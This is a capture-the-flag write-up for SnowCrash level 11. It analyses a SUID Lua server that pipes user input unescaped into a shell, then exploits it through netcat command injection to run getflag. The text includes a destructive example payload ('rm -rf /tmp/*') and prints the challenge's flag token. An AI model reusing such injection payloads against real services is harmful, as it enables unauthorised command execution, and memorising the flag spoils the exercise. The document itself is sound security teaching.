# Level11

## Flag

fa6v5ateaw21peobuub8ipe6s

---

## Discovery

### Checking the directory

```
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```

Observation: the directory contains an executable Lua script with SUID/SGID bits.

### Running the script

```
level11@SnowCrash:~$ ./level11.lua 
lua: ./level11.lua:3: address already in use
stack traceback:
        [C]: in function 'assert'
        ./level11.lua:3: in main chunk
        [C]: ?
```

The error occurs because port 5151 is already in use.

### Script analysis

```
level11@SnowCrash:~$ cat ./level11.lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()
  data = string.sub(data, 1, 40)
  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)
      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end
  end
  client:close()
end
```

Description:

* The Lua script starts a TCP server on 127.0.0.1:5151.
* When a client connects, it sends "Password: " and reads the input.
* The password is processed through sha1sum and compared to the given hash.
* Success: "Gz you dumb*"; failure: "Erf nope..".
* After that, it closes the connection and waits for the next client.

### The issue

The command
`prog = io.popen("echo "..pass.." | sha1sum", "r")`
concatenates user input directly into a shell command. There is no escaping or filtering → command injection is possible.

Example:

```
test; rm -rf /tmp/* | sha1sum
```

This is classic command injection: arbitrary commands are executed with the privileges of the user running the script.

---

## Use (Exploit)

### Connecting to port 5151 and running getflag

```
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: dummy; getflag > /tmp/flag
Erf nope..
```

Although the password is incorrect, the `getflag` command was executed via injection.

### Getting the flag

```
level11@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```

The flag was successfully retrieved.

---

## Prevention

* Do not trust user input when forming shell commands.
* Use safe APIs instead of io.popen, such as hashing libraries.
* Filter and escape special characters when interacting with the shell.
* Restrict permissions on SUID/SGID files and control access to them.

---

## Documentation

* man lua
* man nc
* man io.popen
* SHA1 hashing